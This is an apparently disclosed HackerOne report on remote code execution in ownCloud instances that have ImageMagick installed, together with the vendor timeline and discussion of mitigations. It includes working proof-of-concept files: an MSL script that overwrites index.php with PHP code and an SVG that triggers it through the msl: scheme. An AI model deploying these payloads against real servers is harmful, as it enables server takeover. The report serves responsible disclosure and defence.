---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2023-04-12
submitted: 2023-01-18T23:07:04.547Z
bounty_usd: null
votes: 7
cve: []
program: "[[programs/owncloud|ownCloud]]"
reporter: "lukasreschke"
source: "https://hackerone.com/reports/1838674"
title: "Remote Code Execution on ownCloud instances with ImageMagick installed"
---
# Remote Code Execution on ownCloud instances with ImageMagick installed

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 7 | **Program:** ownCloud | **Disclosed:** 2023-04-12

- Report: [https://hackerone.com/reports/1838674](https://hackerone.com/reports/1838674)
- CWE: Code Injection
- Submitted: 2023-01-18T23:07:04.547Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

It is possible to execute code on ownCloud instances which have ImageMagick installed. This is due to the usage of ImageMagick for preview generation for some file types. (anything using [`OC\Preview\Bitmap`](https://github.com/owncloud/core/blob/83f600f8b89b62d52248dfdbc7046567be024b67/lib/private/Preview/Bitmap.php#L84-L92))

The prerequisite for exploitation seem to be:

- ImageMagick is installed (e.g. as [described in the ownCloud documentation](https://doc.owncloud.com/server/10.10/admin_manual/installation/manual_installation/manual_imagick7.html))
- The attacker knows the file path of a file that they uploaded (e.g. `/mnt/data/files/`)
- The attacker is able to upload files to the system (e.g. by using [File Drop Folders](https://owncloud.com/features/file-drop-folders/) or having an account)

To reproduce we have provided the following files:

- F2127559
```
FROM owncloud/server:10.11
RUN apt-get update && apt-get install -y imagemagick
```

- F2127558
```
<?xml version="1.0" encoding="UTF-8"?>
<image> 
  <read filename="/mnt/data/files/admin/files/Photos/Portugal.jpg" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <comment>&lt;?php echo php_uname(); ?&gt;</comment>
  <write filename="/var/www/owncloud/index.php" />
</image>
```

- F2127557
```
<svg width="1000" height="1000" 
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">       
<image xlink:href="msl:/mnt/data/files/admin/files/exploit.msl" height="500" width="500"/>
</svg>
```

Download these files and then perform the following steps:

- Build the docker image
   - `docker build . -t owncloud-imagemagick`
- Start the docker image
   - `docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest`
- Open the ownCloud instance at localhost:8080 and login using the username “admin” and the password “admin”.
   - Upload the file exploit.msl
   - Upload the file image.rgb
- Reload the page, at this point you will be served the new rewritten index.php that will also perform the phpinfo() command. (you can change which file should be overwritten and what PHP code will be executed inside exploit.msl)

{F2127565}

## Impact

Attackers that are able to upload files to a ownCloud instance with ImageMagick installed can execute arbitrary code on the system.

## Timeline

- **Draft Started**
- **Report Filed**
- **2023-01-18** @ownCloud: Thanks a lot for reporting this potential issue back to us. We take security very seriously and would appreciate if you would not share any information about this bug until we have determined a potential patch.
 
Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster.
- **Report Triaged**
- **2023-01-19** @lukasreschke: I haven't really dived deep into potential mitigations here.

In my  experience it is best to just use a locked down [policy.xml](https://imagemagick.org/script/security-policy.php) (maybe it's possible to set that in PHP using `MAGICK_CONFIGURE_PATH`?) and dedicated short-lived sandboxed machines/processes for anything that deals with converting user supplied content. The latter may be hard with a self-hosted model... (but maybe something valuable for oCIS?)
- **2023-01-19** @corby: Alright, we'll investigate different options and will keep this in mind for oCIS as you said.
I'll keep you updated when there are any news.
- **2023-02-08** @lukasreschke: Has there been any update here? Or communications that insecure image preview providers should be disabled?
- **2023-02-09** @corby: Hi Lukas,

thanks for keeping up with the issue.
There hasn't been any update or communications yet. We tried to find different options to fix this issue but unfortunately the only secure solution is to as you said use a locked down `policy.xml`.
We are preparing a text for publication and changes to the docs and will publish them soon, I hope it will be next week.

Thanks and best regards,
Corby
- **2023-02-20** @lukasreschke: > We are preparing a text for publication and changes to the docs and will publish them soon, I hope it will be next week.

Has there been any publicly shareable update on this? :)
- **2023-02-21** @corby: Hi,

so far we have added this to our docs: https://doc.owncloud.com/server/10.10/admin_manual/installation/manual_installation/manual_imagick7.html#secure-imagemagick
We still have to send out a text to our customers to make them aware of this.

Thanks!
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
